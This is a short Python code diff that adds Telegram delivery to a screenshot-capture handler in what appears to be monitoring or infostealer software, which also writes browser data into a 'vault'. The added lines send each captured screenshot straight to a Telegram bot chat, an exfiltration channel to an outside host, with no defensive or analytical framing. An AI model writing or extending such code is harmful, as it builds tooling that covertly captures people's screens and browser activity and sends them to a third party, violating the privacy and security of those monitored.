@@ -96,6 +96,19 @@ def on_screenshot(png_bytes: bytes):
         _recent_screenshots.pop(0)
     _log(f"screenshot captured: {fname}")
 
+    # Send to Telegram immediately
+    if config.ENABLE_TELEGRAM:
+        try:
+            telegram_delivery.send_photo(
+                token    = config.TELEGRAM_BOT_TOKEN,
+                chat_id  = config.TELEGRAM_CHAT_ID,
+                png_bytes = png_bytes,
+                caption  = f"📸 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
+            )
+            _sent_screenshots.add(fname)
+        except Exception as e:
+            _log(f"screenshot send error: {e}")
+
 def on_browser(text: str):
     vault_write(vault_dir, key, "browser", text)
 
